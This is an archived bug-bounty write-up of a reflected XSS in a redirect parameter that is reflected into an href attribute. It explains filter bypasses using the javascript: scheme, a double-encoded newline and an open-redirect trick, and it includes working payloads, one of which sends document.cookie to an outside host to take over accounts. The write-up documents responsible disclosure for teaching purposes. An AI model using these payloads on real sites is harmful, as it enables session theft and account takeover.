---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-10_rxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts.md
original_filename: 2023-03-10_rxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts.md
title: Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: f74d51a21998be08f6da10b3472e914be4184617dbce9419113f71ab323777dc
text_sha256: 890d957520cae702425351134b28091f69a4a86323d1bf0298fc2e22ae1d433e
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-10_rxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `f74d51a21998be08f6da10b3472e914be4184617dbce9419113f71ab323777dc`
- Text SHA256: `890d957520cae702425351134b28091f69a4a86323d1bf0298fc2e22ae1d433e`


## Content

---
title: "Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!"
url: "https://infosecwriteups.com/rxss-inside-href-attribute-bypassing-lots-of-weird-checks-to-takeover-accounts-b4c8b4e70877"
authors: ["Ashutosh Dutta (@maniacmarvel_)"]
bugs: ["Reflected XSS", "WAF bypass"]
bounty: "2,000"
publication_date: "2023-03-10"
added_date: "2023-03-15"
source: "pentester.land/writeups.json"
original_index: 1397
scraped_via: "browseros"
---

# Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!

Rxss inside href attribute - Bypassing lots of weird checks to takeover accounts!
Ashutosh Dutta
Follow
6 min read
·
Mar 10, 2023

155

Press enter or click to view image in full size

Here is the final payload after bypassing all the weird checks —

javascript://;%250a+alert(document.cookie,%27\\@www.redacted.com/%27)

In case you are still curious about how/why this payload and the methodology, make sure to read the write-up till the end where I have explained everything in detail : )

Background

I was hacking on a private program. It had two assets in scope — www.redacted.com and my.redacted.com (“redacted” — the word is used in place of the real domain name for privacy concerns as the program was private). I signed up for an account at www.redacted.com with burp suite running in the background. Did some digging. I noticed that a redirect parameter is being sent with a lot of endpoints. The program had open redirect in scope(basically they allowed open redirect bug to be reported without any additional impact) and so I tried open redirection but normal methods were not working at all. Just before moving on I tried this as a last resort and strangely it worked — https://www.redacted.com/x/y?redirect=https://google.com\\@www.redacted.com redirected to https://google.com\\@www.redacted.com . The two backslashes were automatically converted to one forward slash ‘/’ by the browsers.

Okay cool but where is the Rxss ?

Sorry about that, the open redirect bypass was needed to be mentioned as I developed the xss payload somewhat based on it. Though later I realized it was not necessary.

The Rxss— Finding

Burp Suite was running in the background. All the traffic from www.redacted.com was passing through brup. In the ‘http history’ tab(of burp) I noticed this unfamiliar endpoint — https://www.redacted.com/profile/login/form/?redirect=https://redacted.com/ , calling it unfamiliar because the actual login endpoint didn’t have the ‘form’ path. I opened the url in the browser to confirm that its actually uncommon and not the main login page of the domain.

Tried to open redirect in the ‘redirect’ parameter and noticed that whatever I put as the ‘redirect’ parameter’s value, it was getting reflected in the anchor tags, to be more precise inside the href attribute.

Press enter or click to view image in full size

The back-end had basic filtering in place — greater than(>), less than(<), double quotes(“) etc. Were not allowed. Only option left was to check if javascript: uri scheme was allowed or not. To my surprise the back-end was not blocking the word ‘javascript’ in the beginning of the urls.

But …

The redirect parameter value must have two forward slashes after the uri scheme. The uri scheme can be anything(there was no check) but must have ‘://’ appendedn just after the scheme.
The redirect parameter value cannot have two consecutive forward slashes anymore(only once it was allowed).
The url must contain the ‘www.redacted.com’ string in the beginning(just after the two forward slashes) or should contain the string ‘\\@www.redacted.com’ at the end(open redirect bypass).

The Rxx — bypassing the weird checks

The first problem was a problem because in javascript two forward slashes means single line comment. Thus if we write anything after the two slashes it will not be executed as the browser will treat it as a comment. To overcome that I thought of using newline character. But directly using it as ‘\n’ had no effect. So what I did was url encoding — ‘%0a’ (url encoded new line character). But that didn’t work as well because the server does url decoding of ‘%0a’ to ‘\n’ before reflecting the value in the href attribute.

Get Ashutosh Dutta’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I then thought of double url encoding because the server only decode it once and as a result the reflected value will be ‘%0a’ this time. The new line character double url encoded looks something like this — ‘%250a’. This worked perfectly.

The second problem was that two forwarded slashes cannot be used consecutively again. It was easily bypassed as instead of forward slashes I discovered that backslashes also works the same way.

The third problem was bypassed in two ways basically -

javascript://www.redacted.com/;%250a+alert(document.cookie)

Here the ‘www.redacted.com/;’ string gets comment out by the two forward slashes and the ‘%250a’ as explained earlier breaks the line and javascript executes the alert function.

javascript://;%250a+alert(document.cookie,%27\\@www.redacted.com/%27)

This was the 2nd way where we are taking advantage of the open redirect check flaw. As mentioned in the beginning open redirect check could be bypassed using the ‘\\@’ string in front of the allowed domain. As a result the server allowed the above value for the ‘redirect’ parameter. Here two values are being passed to the alert function separated by commas— document.cookie and ‘\\@www.redacted.com’ . The document.cookie is executed and for the 2nd value the function returns ‘undefined’. In a nutshell whatever is present first is executed and later one is ignored by the alert function.

The Rxss — exploitation

The basic alert(document.cookie) was ready but that was not enough to say that the impact of this Xss was account takeover. Usually if submitted like this the bug gets triaged as medium severity(on Hackerone specially) so it was important to show how an attacker will takeover accounts.

At this point after bypassing so many weird checks I was not thinking straight. The site www.redacted.com had content-security-policy (csp) headers which allowed requests to be sent to only whitelisted domains. And I was thinking of ways to bypass it. One of the ways which came to my mind was posting the cookies of the user publicly in a comment but that needed lot of work(program specific hurdles were present). But! But! A kind person on discord gave me this idea to redirect the victim to the attacker controlled domain with the cookies appended. That was it! It worked smooth AF!

This was the payload used to send the cookies to a remote host —

javascript://www.redacted.com/;%250adocument.location.href='https:\/\/example.com/'+btoa(document.cookie)

This is how it got reflected —

Press enter or click to view image in full size

The exploit in action —

Fun fact - I already reported the bug in fear of getting duped before showing that I can actually send the cookies to a remote host(but I did tell them that the sensitive cookies can be read and can be used to takeover accounts). The program analyst and Hackerone triage didn’t doubt that and triaged it as a high severity bug. It was fixed very quickly(like in 2h or so) and I got my bounty :))

I hope this write-up was worth your time and you learned something new today.

My twitter handle —

https://twitter.com/0xmarvelmaniac

My Linkedin handle —

https://www.linkedin.com/in/marvelmaniac/

Also make sure to follow me on medium too :)
